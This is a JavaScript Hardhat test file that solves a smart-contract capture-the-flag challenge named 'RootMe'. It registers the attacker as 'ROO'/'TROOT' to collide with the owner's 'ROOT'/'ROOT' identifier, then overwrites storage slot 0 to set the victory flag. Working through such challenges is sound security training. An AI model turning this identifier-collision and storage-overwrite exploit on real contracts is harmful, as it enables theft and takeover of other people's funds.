const {expect} = require("chai");
const {expectRever} = require("@openzeppelin/test-helpers");


describe("CTFS ROOT hacking", function(){


    let owner, hacker, RootMe, rootMe;

    before(async()=>{

        [owner, hacker] = await ethers.getSigners();

        RootMe = await ethers.getContractFactory("RootMe");
        rootMe = await RootMe.deploy();
        await rootMe.deployed();
    });


    it("should give me back the identifier for the owner", async()=>{
        let identifier = await rootMe._getIdentifier("ROOT", "ROOT");
        console.log(identifier);
    });


    it("Attacker should be able to register and get the same identifier of the owner", async()=>{
        await rootMe.connect(hacker).register("ROO", "TROOT");

        let attackerIdentifier = await rootMe._getIdentifier("ROO", "TROOT");
        console.log(attackerIdentifier);
    });


    it("Exploit", async()=>{
        await rootMe.connect(hacker).write(ethers.utils.formatBytes32String(0), "0x0000000000000000000000000000000000000000000000000000000000000001");

        let victory = await rootMe.victory();
        console.log(victory);
    })





})